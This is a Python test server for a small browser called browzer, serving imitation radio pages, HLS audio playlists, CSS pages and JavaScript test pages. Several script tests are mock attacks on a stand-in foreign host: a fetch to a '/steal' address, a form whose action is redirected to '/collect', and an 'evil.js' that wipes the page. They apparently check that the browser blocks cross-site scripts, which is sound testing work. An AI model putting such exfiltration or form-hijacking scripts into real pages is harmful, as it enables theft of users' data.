#!/usr/bin/env python3
"""A local test site for browzer, imitating the sites it has had trouble with.

    test/bench/site.py [PORT] [SONGS]     (default 8150; SONGS: fetch.py's folder)

QEMU's guest reaches it at http://10.0.2.2:PORT/.  Pages:
  /m/ID              a song, sent as The Mod Archive sends it (octet-stream,
                     Content-Disposition, a cookie) from SONGS/ID.*
  /refresh           DuckDuckGo's front page: a <noscript> refresh to the
                     plain page, its address in &quot;, then 200 KB of script
  /plain             where that leads
  /code              a radio page: stream addresses as text in <code>, one long
  /data              a radio page: streams in data attributes as JSON,
                     entity-encoded, one relative, one with \\/ escapes
  /public/chiptune   an AzuraCast station page: no stream, only its art
  /api/nowplaying/chiptune   the station's JSON, naming its streams
  /radio/il          a radio directory's country page: names only, and the Radio
                     Browser directory named in a <link rel="preconnect">
  /radio-browser/json/stations/bycountrycodeexact/IL   that directory's answer
  /js/...            pages with scripts for the script room (see JS below)
  /css/basic         a page whose styles hide things and pin a pop-up
  /hls/master.m3u8   HLS: a master playlist of two bitrates (the high one is
                     missing, so only the leaner may be taken), leading to
  /hls/lo.m3u8       a finished playlist of mp3 in MPEG transport packets
  /hls/raw.m3u8      the same as bare mp3 segments with an ID3 tag in front
  /hls/live.m3u8     a live window of four, sliding on with the clock
                     (the sound is the first ~/.cache/flopos-fuzz/audio/seed*.mp3)
"""
import glob, http.server, json, os, struct, sys, time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8150
SONGS = sys.argv[2] if len(sys.argv) > 2 else os.path.expanduser("~/.cache/flopos-songs")
HOST = "http://10.0.2.2:%d" % PORT

PAGES = {
    "/plain": "<title>plain</title><h1>The plain page</h1><p>Arrived by the refresh.</p>",
    "/code": ("<title>radio page</title><h1>A station</h1><p>Its stream address:</p>"
              "<p><code class=\"break-all\">%s/listen/radio.mp3</code></p>"
              "<p>and a long one, longer than a word can be: %s/a/very/long/path/that/goes/on/and/on/"
              "for/more/than/eighty/characters/stream.mp3.</p>" % (HOST, HOST)),
    "/data": ("<title>radio page</title><h1>Radio</h1><div data-stations=\"[{&quot;id&quot;:1,&quot;name&quot;:"
              "&quot;Live&quot;,&quot;stream&quot;:&quot;/sc/stream/1/&quot;}]\"></div><div data-show=\"{&quot;title"
              "&quot;:&quot;Show 170&quot;,&quot;image&quot;:&quot;http:\\/\\/10.0.2.2:%d\\/art.webp&quot;,"
              "&quot;url&quot;:&quot;http:\\/\\/10.0.2.2:%d\\/Flashback\\/170.mp3&quot;}\"></div>"
              "<script>var api='%s/api/radio/v2/listening';</script>" % (PORT, PORT, HOST)),
    "/radio/il": ("<html><head><link rel=\"preconnect\" href=\"%s/radio-browser\" /><title>radio page</title></head>"
                  "<body><h1>Radio stations from Israel</h1><ul><li>Radio 103FM</li><li>Glglz</li></ul></body></html>" % HOST),
    "/public/chiptune": ("<title>24/7 Chiptune Radio</title><div id=\"app\"></div>"
                         "<img src=\"/api/nowplaying/chiptune/art/1.jpg\"><script>/* a player */</script>"),
}


# Pages for the script room and the styles.  Elsewhere is 10.0.2.3: another
# site as far as browzer is concerned, and never asked for anything.
JS = {
    "/js/basic": """<title>js basic</title><h1 id="h">not yet</h1>
<p id="x">the script did not run</p>
<ul id="list"></ul>
<script>document.getElementById('x').textContent = 'changed by script';
console.log('hello from flopos');</script>
<script src="/js/app.js"></script>
<script src="http://10.0.2.3:8150/js/evil.js"></script>""",
    "/js/app.js": """var ul = document.getElementById('list');
['one', 'two', 'three'].forEach(function (w) { var li = document.createElement('li'); li.textContent = 'item ' + w; ul.appendChild(li); });
document.getElementById('h').textContent = 'built by app.js';""",
    "/js/evil.js": "document.body.innerHTML = 'EVIL RAN';",
    "/js/click": """<title>js click</title><p id="out">clicked 0</p>
<button id="b">press me</button>
<script>var n = 0; document.getElementById('b').addEventListener('click', function () {
  n++; document.getElementById('out').textContent = 'clicked ' + n; });</script>""",
    "/js/fetch": """<title>js fetch</title><ul id="l"><li>waiting</li></ul>
<script>fetch('/api/items').then(function (r) { return r.json(); }).then(function (items) {
  var l = document.getElementById('l'); l.innerHTML = '';
  items.forEach(function (it) { var li = document.createElement('li'); li.textContent = 'fetched ' + it.name; l.appendChild(li); });
});</script>""",
    "/api/items": """[{"name": "alpha"}, {"name": "beta"}]""",
    "/js/timer": """<title>js timer</title><p id="t">tick 0</p>
<script>var k = 0; var h = setInterval(function () { k++; document.getElementById('t').textContent = 'tick ' + k; if (k == 3) clearInterval(h); }, 300);</script>""",
    "/js/elsewhere": """<title>js elsewhere</title><p id="p">fetching</p>
<script>fetch('http://10.0.2.3:8150/steal?x=1').then(function () { document.getElementById('p').textContent = 'STOLE'; });</script>""",
    "/js/form": """<title>js form</title><form id="f" action="/ok"><input name="q"></form>
<script>document.getElementById('f').setAttribute('action', 'http://10.0.2.3:8150/collect');
document.getElementById('f').insertAdjacentHTML('beforeend', '<p>STILL RUNNING</p>');</script>""",
    "/js/loop": """<title>js loop</title><p>a script that never ends</p><script>while (true) {}</script>""",
    "/radio/player": """<title>radio player</title><h1>A station</h1>
<div id="radio-stream" class="play" url="/m/201549"><div class="btn">Listen Live</div></div>
<audio controls><source src="/m/135819" type="audio/xm"></audio>
<script type="application/json">{"stations":[{"name":"Main","stream_url":"https:\\/\\/example.test\\/listen\\/main\\/radio.mp3"}]}</script>
<p>The end.</p>""",
    "/radio/feed": """<title>radio feed</title><p>MAIN</p><h2 data-feed-title>Listen live</h2>
<button type="button" data-play>Play</button>
<script type="application/json">[{"slug":"main","name":"Main","stream_url":"\\/m\\/201549"}]</script>""",
    "/js/pieces": """<title>js pieces</title><form id="f"><input name="a" value="1"><input type="checkbox" name="b" checked value="y"></form><p id="o">not yet</p>
<script>var r=[];
var c=new AbortController();c.signal.addEventListener('abort',function(){r.push('aborted');});c.abort();
r.push(c.signal.aborted?'signal':'nosignal');
r.push(document.body instanceof HTMLElement?'instanceof':'notinstance');
r.push(new FormData(document.getElementById('f')).toString());
r.push(typeof Symbol.iterator);
r.push(structuredClone({x:[1,2]}).x[1]);var cl=document.getElementById('f').cloneNode(true);r.push(cl.lastChild&&cl.lastChild.name==='b'&&cl.parentNode===null?'clone':'noclone');
var w='\\u00e5\\u00e4\\ud83d\\ude00';r.push(new TextDecoder().decode(new TextEncoder().encode(w))===w?'utf8':'badutf8');
Promise.any([Promise.reject(1),Promise.resolve('any')]).then(function(v){r.push(v);document.getElementById('o').textContent='pieces: '+r.join(' ');});
</script>""",
    "/js/async": """<title>js async</title><ul id="l"><li>waiting</li></ul><p id="c">not clicked</p>
<script>
async function load() {
  const r = await fetch('/api/items');
  const items = await r.json();
  document.getElementById('l').innerHTML = items.map(i => '<li>async ' + i.name + '</li>').join('');
}
load();
document.getElementById('c').addEventListener('click', async e => {
  await new Promise(r => setTimeout(r, 10));
  e.target.textContent = 'clicked, after a wait';
});
</script>""",
    "/table/basic": """<title>table basic</title><h1>Stations</h1>
<table><caption>Three stations</caption>
<thead><tr><th>Name</th><th>City</th><th>Kind</th></tr></thead>
<tbody>
<tr><td><a href="/m/201549">Radio One</a></td><td>Sofia</td><td>Talk and music, all day and all night, with news on the hour and a long story read out after midnight</td></tr>
<tr><td>Two</td><td colspan="2">A city and a kind in one wide cell</td></tr>
<tr><td>Three</td><td><form action="/ok"><input name="q" size="10"></form></td><td>A box in a cell</td></tr>
</tbody></table>
<p>After the table.</p>""",
    "/css/basic": """<title>css basic</title>
<style>.ad { display: none } .popup { position: fixed; top: 0 } .warn { color: #d00; font-weight: bold }
h1 { text-align: center } nav ul { list-style: none } .sr { position: absolute; width: 1px; height: 1px; clip: rect(0 0 0 0) }
@media (max-width: 600px) { .phone { display: block } } .phone { display: none } :hover .menu { display: block } .menu { display: none }</style>
<h1>Centred title</h1><p class="ad">AN ADVERT</p><div class="popup">SUBSCRIBE NOW</div>
<p class="warn">A warning</p><span class="sr">SCREEN READER ONLY</span><p class="phone">PHONE MENU</p>
<nav><ul><li>Home</li><li>About</li></ul></nav><div class="menu">HOVER MENU</div><p hidden>HIDDEN ATTR</p><p>The end.</p>""",
}

# ---- HLS ---------------------------------------------------------------------
def _mp3(b):
    """The frames of an MPEG-1 layer III file, after any ID3 tag."""
    i = 0
    if b[:3] == b"ID3":
        i = 10 + ((b[6] & 127) << 21 | (b[7] & 127) << 14 | (b[8] & 127) << 7 | (b[9] & 127))
    rates = (0, 32, 40, 48, 56, 64, 80, 96, 112, 128, 160, 192, 224, 256, 320)
    out, sr = [], 44100
    while i + 4 <= len(b):
        if b[i] != 0xFF or (b[i + 1] & 0xFE) != 0xFA: i += 1; continue   # MPEG-1 layer III
        br = rates[b[i + 2] >> 4] if (b[i + 2] >> 4) < 15 else 0
        sr = (44100, 48000, 32000, 0)[(b[i + 2] >> 2) & 3]
        if not br or not sr: i += 1; continue
        n = 144000 * br // sr + ((b[i + 2] >> 1) & 1)
        if i + n > len(b): break
        out.append(b[i:i + n]); i += n
    return out, sr

def _frames():
    fr, sr = [], 44100
    for f in sorted(glob.glob(os.path.expanduser("~/.cache/flopos-fuzz/audio/seed*.mp3"))):
        got, sr = _mp3(open(f, "rb").read())
        if got: fr = got; break
    if not fr: return [], 44100
    while len(fr) * 1152 < sr * 40: fr = fr + fr            # forty seconds at least
    return fr, sr

FRAMES, RATE = _frames()
SEG_FRAMES = max(1, 2 * RATE // 1152)                         # two seconds a segment
NSEG = len(FRAMES) // SEG_FRAMES
T0 = time.time()

def _seg(n):
    n %= max(1, NSEG)
    return b"".join(FRAMES[n * SEG_FRAMES:(n + 1) * SEG_FRAMES])

def _ts(es, cc=[0]):
    def pkt(pid, payload, start):
        hdr = bytes([0x47, (0x40 if start else 0) | (pid >> 8), pid & 0xFF])
        cc[0] = (cc[0] + 1) & 15
        if len(payload) >= 184: return hdr + bytes([0x10 | cc[0]]) + payload[:184], payload[184:]
        stuff = 184 - len(payload) - 1                        # adaptation field fills the rest
        af = bytes([stuff]) + (bytes([0]) + b"\xff" * (stuff - 1) if stuff else b"")
        return hdr + bytes([0x30 | cc[0]]) + af + payload, b""
    pat = b"\x00\x00\xb0\x0d\x00\x01\xc1\x00\x00\x00\x01\xf0\x00" + b"\x00" * 4
    pmt = b"\x00\x02\xb0\x12\x00\x01\xc1\x00\x00\xe1\x01\xf0\x00\x03\xe1\x01\xf0\x00" + b"\x00" * 4
    out = pkt(0, pat + b"\xff" * (184 - len(pat)), True)[0] + pkt(0x1000, pmt + b"\xff" * (184 - len(pmt)), True)[0]
    pes = b"\x00\x00\x01\xc0\x00\x00\x80\x80\x05\x21\x00\x01\x00\x01" + es
    first = True
    while pes:
        p, pes = pkt(0x101, pes, first); first = False
        out += p
    return out

def _id3():
    return b"ID3\x04\x00\x00\x00\x00\x00\x0a" + b"PRIV\x00\x00\x00\x00\x00\x00"[:10]

def hls(p):
    """(content type, body) for an /hls/ path, or None."""
    pl = "application/vnd.apple.mpegurl"
    if p == "/hls/master.m3u8":
        return pl, b"#EXTM3U\n#EXT-X-STREAM-INF:BANDWIDTH=256000,CODECS=\"mp4a.40.2\"\nhi.m3u8\n#EXT-X-STREAM-INF:BANDWIDTH=64000,CODECS=\"mp4a.40.2\"\nlo.m3u8\n"
    if p in ("/hls/lo.m3u8", "/hls/raw.m3u8"):
        ext = "ts" if "lo" in p else "mp3"
        body = "#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:2\n#EXT-X-MEDIA-SEQUENCE:0\n"
        for n in range(min(NSEG, 12)): body += "#EXTINF:2.0,\n%s/%d.%s\n" % (ext, n, ext)
        return pl, (body + "#EXT-X-ENDLIST\n").encode()
    if p == "/hls/live.m3u8":
        now = int((time.time() - T0) / 2)
        body = "#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:2\n#EXT-X-MEDIA-SEQUENCE:%d\n" % now
        for n in range(now, now + 4): body += "#EXTINF:2.0,\n%s/hls/ts/%d.ts\n" % (HOST, n)
        return pl, body.encode()
    if p.startswith("/hls/ts/") and p.endswith(".ts"):
        return "video/mp2t", _ts(_seg(int(p[8:-3])))
    if p.startswith("/hls/mp3/") and p.endswith(".mp3"):
        return "audio/mpeg", _id3() + _seg(int(p[9:-4]))
    return None


class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.0"
    def log_message(self, *a): pass
    def send(self, code, ctype, body, extra=()):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        for k, v in extra: self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)
    def do_GET(self):
        p = self.path
        if p.startswith("/m/"):
            found = glob.glob(os.path.join(SONGS, os.path.basename(p[3:]) + ".*"))
            if not found: return self.send(404, "text/plain", b"no such song")
            body = open(found[0], "rb").read()
            return self.send(200, "application/octet-stream", body,
                             [("Content-Disposition", "attachment; filename=" + os.path.basename(found[0])),
                              ("Set-Cookie", "TMASession=test; path=/")])
        if p == "/refresh":
            page = ("<html><head><title>DuckDuckGo-like</title><script>" + "var x=1;" * 2000 + "</script>"
                    "<noscript><meta http-equiv=\"refresh\" content=\"0; url=&quot;%s/plain&quot;\"/></noscript>"
                    "</head><body><script>" % HOST + "var y=2;" * 25000 + "</script></body></html>")
            return self.send(200, "text/html; charset=UTF-8", page.encode())
        if p == "/api/nowplaying/chiptune":
            station = {"station": {"shortcode": "chiptune", "listen_url": HOST + "/listen/chiptune/radio.mp3",
                                   "public_player_url": HOST + "/public/chiptune",
                                   "mounts": [{"url": HOST + "/listen/chiptune/radio.mp3", "format": "mp3", "bitrate": 128},
                                              {"url": HOST + "/listen/chiptune/low.ogg", "format": "ogg", "bitrate": 64}]},
                       "now_playing": {"song": {"art": HOST + "/api/nowplaying/chiptune/art/1.jpg", "title": "A tune"}}}
            return self.send(200, "application/json", json.dumps(station).replace("/", "\\/").encode())
        if p.startswith("/radio-browser/json/stations/bycountrycodeexact/IL?"):
            st = [{"name": "Radio 103FM", "url_resolved": HOST + "/listen/103.mp3", "codec": "MP3", "bitrate": 0, "tags": "a,b"},
                  {"name": "\u05d2\u05dc\u05d2\u05dc\u05e6 - Glglz", "url_resolved": HOST + "/listen/glglz_mp3", "codec": "MP3", "bitrate": 128},
                  {"name": "\u05d2\u05dc\u05e6", "url_resolved": HOST + "/listen/glz?a=1&b=2", "codec": "AAC+", "bitrate": 64}]
            # UTF-8 as it is in the first two, \\u escapes in the third, \\/ throughout
            body = (json.dumps(st[:2], ensure_ascii=False)[:-1] + ", " + json.dumps(st[2]) + "]").replace("/", "\\/")
            return self.send(200, "application/json", body.encode())
        if p.startswith("/hls/"):
            h = hls(p)
            if h: return self.send(200, h[0], h[1])
        if p in JS:
            ctype = "application/javascript" if p.endswith(".js") else "application/json" if p.startswith("/api/") else "text/html; charset=UTF-8"
            return self.send(200, ctype, JS[p].encode())
        if p in PAGES: return self.send(200, "text/html", PAGES[p].encode())
        self.send(404, "text/plain", b"not here")

if __name__ == "__main__":
    http.server.ThreadingHTTPServer(("127.0.0.1", PORT), Handler).serve_forever()
